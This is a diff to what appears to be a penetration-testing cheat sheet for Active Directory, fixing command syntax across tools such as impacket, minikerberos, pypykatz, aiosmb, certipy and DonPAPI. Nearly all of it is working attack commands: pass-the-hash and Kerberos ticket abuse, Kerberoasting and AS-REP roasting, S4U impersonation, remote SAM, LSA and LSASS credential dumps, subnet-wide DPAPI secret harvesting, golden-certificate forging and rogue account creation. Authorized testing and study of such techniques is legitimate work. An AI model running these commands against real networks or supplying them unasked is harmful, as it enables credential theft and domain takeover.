@@ -91,13 +91,13 @@
 
 | Scenario | impacket | Titanis | minikerberos URL | msldap URL | Metasploit | aiosmb URL |
 |---|---|---|---|---|---|---|
-| Password | `DOMAIN/user:Pass@host` | `-UserName user@DOMAIN -Password Pass` | `kerberos-password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` | `smb+ntlm-password://DOMAIN\user:Pass@host` |
-| Pass-the-Hash | `-hashes :NTLM` | `-NtlmHash <NTLM>` | `kerberos-nt://DOMAIN\user:NTLM@kdc` | `ldap+ntlm-nt://DOMAIN\user:NTLM@dc` | `SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM` | `smb+ntlm-nt://DOMAIN\user:NTLM@host` |
-| AES key | `-aesKey <hex>` | `-AesKey <hex>` | `kerberos-aes://DOMAIN\user:hex@kdc` | `ldap+kerberos-aes://.../?dc=ip` | `AESKEY <hex>` | `smb+kerberos-aes://DOMAIN\user:hex@host/?dc=ip` |
-| RC4 key | via `-hashes` | `-NtlmHash` | `kerberos-rc4://DOMAIN\user:NTLM@kdc` | `ldap+kerberos-rc4://.../?dc=ip` | `NTHASH <NTLM>` | `smb+kerberos-rc4://DOMAIN\user:NTLM@host/?dc=ip` |
-| ccache | `KRB5CCNAME=file.ccache` | `-TicketCache file.ccache` | `kerberos-ccache://...?ccache=f.ccache` | `ldap+kerberos-ccache://.../?dc=ip&ccache=f.ccache` | `KrbUseCachedCredentials true` | `smb+kerberos-ccache://DOMAIN\user:@host/?dc=ip&ccache=f.ccache` |
+| Password | `DOMAIN/user:Pass@host` | `-UserName user@DOMAIN -Password Pass` | `kerberos+password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` | `smb+ntlm-password://DOMAIN\user:Pass@host` |
+| Pass-the-Hash | `-hashes :NTLM` | `-NtlmHash <NTLM>` | `kerberos+ntlm-nt://DOMAIN\user:NTLM@kdc` | `ldap+ntlm-nt://DOMAIN\user:NTLM@dc` | `SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM` | `smb+ntlm-nt://DOMAIN\user:NTLM@host` |
+| AES key | `-aesKey <hex>` | `-AesKey <hex>` | `kerberos+aes://DOMAIN\user:hex@kdc` | `ldap+kerberos+aes://.../?dc=ip` | `AESKEY <hex>` | `smb+kerberos+aes://DOMAIN\user:hex@host/?dc=ip` |
+| RC4 key | via `-hashes` | `-NtlmHash` | `kerberos+rc4://DOMAIN\user:NTLM@kdc` | `ldap+kerberos+rc4://.../?dc=ip` | `NTHASH <NTLM>` | `smb+kerberos+rc4://DOMAIN\user:NTLM@host/?dc=ip` |
+| ccache | `KRB5CCNAME=file.ccache` | `-TicketCache file.ccache` | `kerberos+ccache://...?ccache=f.ccache` | `ldap+kerberos+ccache://.../?dc=ip&ccache=f.ccache` | `KrbUseCachedCredentials true` | `smb+kerberos+ccache://DOMAIN\user:@host/?dc=ip&ccache=f.ccache` |
 | kirbi ticket | convert first | `-Ticket file.kirbi` | `minikerberos-kirbi2ccache` first | convert first | `auxiliary/admin/kerberos/ticket_converter` | convert to ccache first |
-| PKINIT / PFX | certipy / gettgtpkinit | — | `kerberos-pfx://...?pfx=f.pfx&pfxpass=P` | `ldap+kerberos-pfx://.../?dc=ip&pfx=f.pfx` | — | `smb+kerberos-pfx://DOMAIN\user:@host/?dc=ip&pfx=f.pfx&pfxpass=P` |
+| PKINIT / PFX | certipy / gettgtpkinit | — | `kerberos+pfx://...?pfx=f.pfx&pfxpass=P` | `ldap+kerberos+pfx://.../?dc=ip&pfx=f.pfx` | — | `smb+kerberos+pfx://DOMAIN\user:@host/?dc=ip&pfx=f.pfx&pfxpass=P` |
 | NEGOEX / PFX | — | — | n/a | n/a | — | `smb+negoex-pfx://cert.pfx:certpass@host/` |
 | SOCKS5 | `proxychains` prefix | `-Socks5 host:port` | n/a | `?proxytype=socks5&proxyhost=...&proxyport=...` | `set Proxies socks5:127.0.0.1:1080` | `?proxyhost=127.0.0.1&proxyport=1080` |
 | SOCKS4 | n/a | n/a | n/a | n/a | n/a | `?proxytype=socks4&proxyhost=127.0.0.1&proxyport=1080` |
@@ -255,7 +255,7 @@ done < hosts.txt
 getTGT.py DOMAIN/jdoe:Password123 -dc-ip 192.168.1.1
 
 # minikerberos — password
-minikerberos-getTGT "kerberos-password://DOMAIN\jdoe:Password123@192.168.1.1" jdoe.ccache
+minikerberos-getTGT "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" --ccache jdoe.ccache
 
 # Titanis — password (outputs kirbi)
 kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
@@ -270,7 +270,7 @@ msf6 auxiliary(get_ticket) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL user=jdo
 getTGT.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe -dc-ip 192.168.1.1
 
 # minikerberos — NTLM hash
-minikerberos-getTGT "kerberos-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" jdoe.ccache
+minikerberos-getTGT "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" --ccache jdoe.ccache
 
 # Titanis — NTLM hash
 kerb asreq -UserName jdoe -Realm DOMAIN -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
@@ -281,8 +281,8 @@ getTGT.py -aesKey 76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4
 
 # minikerberos — AES256
 minikerberos-getTGT \
-  "kerberos-aes://DOMAIN\jdoe:76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4@192.168.1.1" \
-  jdoe.ccache
+  "kerberos+aes://DOMAIN\jdoe:76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4@192.168.1.1" \
+  --ccache jdoe.ccache
 
 # Titanis — AES256
 kerb asreq -UserName jdoe -Realm DOMAIN \
@@ -294,7 +294,8 @@ certipy auth -pfx jdoe.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL
 
 # minikerberos — PKINIT (also recovers NT hash via UnPAC)
 minikerberos-getTGT \
-  "kerberos-pfx://DOMAIN\jdoe:@192.168.1.1?pfx=jdoe.pfx&pfxpass=Password123" jdoe.ccache
+  "kerberos+pfx://DOMAIN\jdoe:@192.168.1.1?pfx=jdoe.pfx&pfxpass=Password123" \
+  --ccache jdoe.ccache
 
 # Titanis — explicit RC4
 kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
@@ -317,7 +318,7 @@ msf6 auxiliary(get_ticket) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL user=jdo
 
 # minikerberos (requires existing ccache)
 minikerberos-getTGS \
-  "kerberos-ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" \
+  "kerberos+ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" \
   cifs/fileserver.domain.local fileserver.ccache
 
 # Titanis
@@ -342,12 +343,12 @@ getST.py -spn cifs/target.domain.local -impersonate Administrator \
 
 # minikerberos — S4U2self
 minikerberos-getS4U2self \
-  "kerberos-password://DOMAIN\svc$:Password123@192.168.1.1" \
+  "kerberos+password://DOMAIN\svc$:Password123@192.168.1.1" \
   Administrator@DOMAIN.LOCAL s4u_self.ccache
 
 # minikerberos — S4U2proxy
 minikerberos-getS4U2proxy \
-  "kerberos-password://DOMAIN\svc$:Password123@192.168.1.1" \
+  "kerberos+password://DOMAIN\svc$:Password123@192.168.1.1" \
   cifs/target.domain.local s4u_self.ccache s4u_proxy.ccache
 
 # Titanis — combined self+proxy
@@ -379,20 +380,20 @@ msf6 auxiliary(get_user_spns) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
 netexec ldap 192.168.1.1 -u jdoe -p Password123 --kerberoasting kerberoast.txt
 
 # minikerberos
-minikerberos-kerberoast "kerberos-password://DOMAIN\jdoe:Password123@192.168.1.1" \
+minikerberos-kerberoast "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" \
   kerberoast_hashes.txt
 
 # minikerberos — NTLM hash
-minikerberos-kerberoast "kerberos-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
+minikerberos-kerberoast "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
   kerberoast_hashes.txt
 
 # pypykatz
-pypykatz kerberos spnroast "kerberos-password://DOMAIN\jdoe:Password123@192.168.1.1" \
+pypykatz kerberos spnroast "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" \
   -o kerberoast_hashes.txt
 
 # pypykatz — NTLM hash
 pypykatz kerberos spnroast \
-  "kerberos-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
+  "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
   -o kerberoast_hashes.txt
 
 # msldap
@@ -432,29 +433,28 @@ msf6 auxiliary(kerberos_enumusers) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL 
 netexec ldap 192.168.1.1 -u jdoe -p Password123 --asreproast asrep.txt
 
 # pypykatz — no credentials required, userlist
-pypykatz kerberos asreproast "kerberos-password://DOMAIN\@192.168.1.1" \
+pypykatz kerberos asreproast "kerberos+password://DOMAIN\@192.168.1.1" \
   --userlist users.txt -o asrep_hashes.txt
 
 # pypykatz — authenticated, auto-discover targets via LDAP
-pypykatz kerberos asreproast "kerberos-password://DOMAIN\jdoe:Password123@192.168.1.1" \
+pypykatz kerberos asreproast "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" \
   --ldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1" -o asrep_hashes.txt
 
 # minikerberos — userlist (no credentials required)
-minikerberos-asreproast "kerberos-password://DOMAIN\@192.168.1.1" \
-  -t users.txt -o asrep_hashes.txt
+# syntax: minikerberos-asreproast <server_ip> <domain> [user | @userlist.txt]
+minikerberos-asreproast 192.168.1.1 DOMAIN @users.txt
 
-# minikerberos — NTLM hash auth
-minikerberos-asreproast \
-  "kerberos-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
-  -t users.txt -o asrep_hashes.txt
+# minikerberos — NTLM hash auth (enumerate via LDAP, then roast)
+# Pass individual username or @file; no URL arg — server+domain are positional
+minikerberos-asreproast 192.168.1.1 DOMAIN @users.txt
 
 # msldap (enumerate targets only — no hash capture)
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> asrep
 
 # Titanis — find targets via LDAP, loop asreq
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
+ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+  "(userAccountControl|=4194304)" \
   -OutputFields sAMAccountName > asrep_targets.txt
 while IFS= read -r user; do
   kerb asreq -UserName "$user" -Realm DOMAIN \
@@ -492,7 +492,7 @@ pypykatz kerberos ccache roast stolen.ccache
 kerbrute userenum -d DOMAIN --dc 192.168.1.1 users.txt
 
 # pypykatz — enumerate valid accounts (no credentials)
-pypykatz kerberos brute "kerberos-password://DOMAIN\@192.168.1.1" users.txt
+pypykatz kerberos brute "kerberos+password://DOMAIN\@192.168.1.1" users.txt
 
 # impacket — shows no-preauth accounts only
 GetNPUsers.py -dc-ip 192.168.1.1 -no-pass -usersfile users.txt DOMAIN/
@@ -536,7 +536,7 @@ certipy auth -pfx admin.pfx -username Administrator -domain DOMAIN.LOCAL \
 
 # minikerberos — certificate → NT hash only
 minikerberos-getNTPKInit \
-  "kerberos-pfx://DOMAIN\targetuser:@192.168.1.1?pfx=targetuser.pfx" \
+  "kerberos+pfx://DOMAIN\targetuser:@192.168.1.1?pfx=targetuser.pfx" \
   targetuser_nt.txt
 
 # PKINITtools — gettgtpkinit.py: PFX → TGT ccache + prints AS-REP enc key
@@ -554,7 +554,7 @@ certipy req -username jdoe@DOMAIN -password Password123 \
   -upn Administrator@DOMAIN.LOCAL \
   -target ca.domain.local -out admin
 minikerberos-getNTPKInit \
-  "kerberos-pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
+  "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
 wmi exec 192.168.1.10 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
 ```
 
@@ -574,7 +574,7 @@ kinit -R
 krenew -v -b -t
 
 # minikerberos
-minikerberos-renewTGT "kerberos-ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" jdoe-renewed.ccache
+minikerberos-renewTGT "kerberos+ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" jdoe-renewed.ccache
 
 # Titanis
 kerb renew -Ticket jdoe-tgt.kirbi -OutputFileName jdoe-tgt-renewed.kirbi
@@ -715,7 +715,7 @@ asmbshareenum "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 asmbshareenum "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"
 
 # aiosmb — Kerberos ccache
-asmbshareenum "smb+kerberos-ccache://DOMAIN\jdoe:@192.168.1.10/?dc=192.168.1.1&ccache=jdoe.ccache"
+asmbshareenum "smb+kerberos+ccache://DOMAIN\jdoe:@192.168.1.10/?dc=192.168.1.1&ccache=jdoe.ccache"
 
 # Titanis
 smb2 enumshares \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
@@ -760,13 +760,13 @@ smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
 smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
   -c 'get Windows\System32\drivers\etc\hosts hosts.txt'
 
-# aiosmb — password
-asmbgetfile "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10" \
-  "C$/Windows/System32/drivers/etc/hosts" hosts.txt
+# aiosmb — password (full path embedded in URL after the host)
+asmbgetfile "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10/C$/Windows/System32/drivers/etc/hosts" \
+  -o hosts.txt
 
 # aiosmb — pass-the-hash
-asmbgetfile "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10" \
-  "C$/Windows/System32/drivers/etc/hosts" hosts.txt
+asmbgetfile "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10/C$/Windows/System32/drivers/etc/hosts" \
+  -o hosts.txt
 
 # Titanis
 smb2 get \\192.168.1.10\C$\Windows\System32\drivers\etc\hosts hosts.txt \
@@ -995,10 +995,14 @@ smb2 enumnics \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Passwor
 netexec smb 192.168.1.0/24 -u jdoe -p Password123 --shares
 
 # aiosmb — async subnet scanner (faster than looping)
-asmbscanner "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.0/24"
+# syntax: asmbscanner [global_opts] {file|brute|list} <url> <ip/cidr>
+# results written to TSV files in output dir (-o dir, default: current dir)
+asmbscanner -w 5 --no-progress file \
+  "smb+ntlm-password://DOMAIN\jdoe:Password123@" 192.168.1.0/24
 
 # aiosmb — pass-the-hash
-asmbscanner "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.0/24"
+asmbscanner -w 5 --no-progress file \
+  "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@" 192.168.1.0/24
 
 # Titanis
 while IFS= read -r host; do
@@ -1122,7 +1126,7 @@ netexec smb 192.168.1.10 -u jdoe -p Password123 --sam --lsa
 # pypykatz — remote registry dump via SMB
 pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"
-pypykatz smb regdump "smb2+kerberos-ccache://DOMAIN\jdoe:@192.168.1.10?ccache=jdoe.ccache"
+pypykatz smb regdump "smb2+kerberos+ccache://DOMAIN\jdoe:@192.168.1.10?ccache=jdoe.ccache"
 
 # pypykatz — remote LSASS dump + parse via SMB
 pypykatz smb lsassdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
@@ -1468,7 +1472,7 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumdomusers"
 
 # msldap
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
-# msldap> users
+# msldap> adinfo
 
 # Titanis
 sam enumusers 192.168.1.10 -UserName jdoe -Password Password123
@@ -1504,7 +1508,7 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumalsgroups builtin"
 
 # msldap
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
-# msldap> groups
+# msldap> adinfo
 
 # bloodyAD — domain groups
 bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search \
@@ -1695,9 +1699,9 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
 # bloodyAD — no userRight subcommand; use rpcclient or Titanis for LSA privilege assignment
 
 # Titanis
-lsa addpriv      192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe SeDebugPrivilege
-lsa rmpriv       192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe SeDebugPrivilege
-lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe 0x20
+lsa addpriv      192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
+lsa rmpriv       192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
+lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe 0x20
 ```
 
 [↑ Back to Index](#index)
@@ -1715,11 +1719,11 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumprivs"
 enum4linux-ng -P 192.168.1.10 -u jdoe -p Password123
 
 # Titanis
-lsa enumaccounts     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
-lsa enumprivaccounts 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 SeDebugPrivilege
-lsa getprivs         192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe
-lsa getrights        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe
-lsa getsysaccess     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 jdoe
+lsa enumaccounts     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123  # requires admin
+lsa enumprivaccounts 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -Privilege SeDebugPrivilege
+lsa getprivs         192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
+lsa getrights        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
+lsa getsysaccess     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
 ```
 
 [↑ Back to Index](#index)
@@ -1745,13 +1749,13 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search --filter "(o
 
 # msldap — password
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
-# msldap> users / computers / info / trusts / gpos
+# msldap> adinfo
 
 # msldap — pass-the-hash
 msldap "ldap+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1"
 
 # msldap — Kerberos ccache
-msldap "ldap+kerberos-ccache://DOMAIN\jdoe:@dc01.domain.local/?dc=192.168.1.1&ccache=jdoe.ccache"
+msldap "ldap+kerberos+ccache://DOMAIN\jdoe:@dc01.domain.local/?dc=192.168.1.1&ccache=jdoe.ccache"
 
 # msldap — via SOCKS5
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=socks5&proxyhost=127.0.0.1&proxyport=1080"
@@ -1777,7 +1781,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search \
 
 # msldap
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
-# msldap> gpos / trusts
+# msldap> trusts
 
 # Titanis — enumerate GPO containers
 ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
@@ -1844,11 +1848,11 @@ ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
 
 ```bash
 # impacket
-addcomputer.py -method LDAP -computer-name EVILPC$ -computer-pass Password123 \
+addcomputer.py -method LDAPS -computer-name EVILPC$ -computer-pass Password123 \
   -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123
 
 # impacket — pass-the-hash
-addcomputer.py -method LDAP -computer-name EVILPC$ -computer-pass Password123 \
+addcomputer.py -method LDAPS -computer-name EVILPC$ -computer-pass Password123 \
   -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -dc-ip 192.168.1.1 DOMAIN/jdoe
 
 # NetExec
@@ -1868,11 +1872,8 @@ ldap addcomputer 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 EVILPC$
 ### Add a User Account
 
 ```bash
-# impacket — net.py creates user via SAMR (account starts disabled; enable separately)
-net.py DOMAIN/admin:Password123@192.168.1.1 user -add newuser
-net.py DOMAIN/admin:Password123@192.168.1.1 user -enable newuser
-# Note: net.py does not set a password on creation — follow up with changepasswd.py
-changepasswd.py -reset DOMAIN/admin:Password123@192.168.1.1 -newpass Password123! -altuser DOMAIN/newuser
+# impacket — net.py does NOT support user -add; use bloodyAD or netexec instead
+# (net.py only supports user -list, -enable, -disable; creation via SAMR is not implemented)
 
 # bloodyAD — password
 bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add user newuser Password123!
@@ -1972,7 +1973,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
 
 # Titanis
 ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  targetuser userAccountControl+=DONT_REQUIRE_PREAUTH
+  targetuser userAccountControl+=4194304
 ```
 
 [↑ Back to Index](#index)
@@ -2037,8 +2038,9 @@ credcoerce 192.168.1.10 \\<relay-listener-ip>\share \
 ### Self-Signed PFX Generation
 
 ```bash
-# certipy — self-signed cert with arbitrary UPN (not CA-signed; useful for Shadow Credentials)
-certipy forge -upn jdoe@DOMAIN -out jdoe.pfx
+# certipy — Golden Certificate from compromised CA key (requires -ca-pfx)
+# Note: certipy forge cannot produce a self-signed cert without the CA private key;
+#       for Shadow Credentials use certipy shadow or impacket's pyWhisker instead
 
 # certipy — Golden Certificate from compromised CA key
 certipy forge -upn Administrator@DOMAIN -ca-pfx ca.pfx -out admin.pfx
@@ -2049,7 +2051,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -node
 openssl pkcs12 -export -out jdoe.pfx -inkey key.pem -in cert.pem -passout pass:Password123
 
 # Titanis
-cert selfcert -Subject CN=jdoe -OutputFile jdoe.pfx
+cert selfcert -Subject CN=jdoe -PfxFileName jdoe.pfx
 ```
 
 [↑ Back to Index](#index)
@@ -2070,7 +2072,8 @@ netexec ldap 192.168.1.1 -u jdoe -p Password123 -M adcs
 
 # msldap — raw template list
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
-# msldap> adcs
+# msldap> certify
+# msldap> certtemplates
 
 # Titanis — enumerate certificate templates
 ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
@@ -2119,7 +2122,7 @@ certipy auth -pfx admin.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL
 
 # Step 3b — minikerberos: recover NT hash only
 minikerberos-getNTPKInit \
-  "kerberos-pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
+  "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
 
 # Step 4 — Titanis PTH with recovered hash
 wmi exec dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
@@ -2230,15 +2233,15 @@ netexec smb 192.168.1.0/24 -u Administrator -p Password123 --dpapi nosystem
 
 # DonPAPI — comprehensive remote DPAPI harvest across subnet in one pass
 # (auto-fetches backup key, decrypts masterkeys, dumps all DPAPI-protected secrets)
-DonPAPI -d DOMAIN -u Administrator -p Password123 \
+DonPAPI collect -d DOMAIN -u Administrator -p Password123 \
   -t 192.168.1.0/24 --fetch-pvk
 
 # DonPAPI — supply existing backup key (quieter; avoids re-dumping from DC)
-DonPAPI -d DOMAIN -u Administrator -p Password123 \
+DonPAPI collect -d DOMAIN -u Administrator -p Password123 \
   -t 192.168.1.0/24 --pvkfile domain_backup.pvk
 
 # DonPAPI — targeted collectors only
-DonPAPI -d DOMAIN -u Administrator -p Password123 \
+DonPAPI collect -d DOMAIN -u Administrator -p Password123 \
   -t 192.168.1.0/24 --collectors SCCM,Certificates,Wifi,CredMan
 ```
 
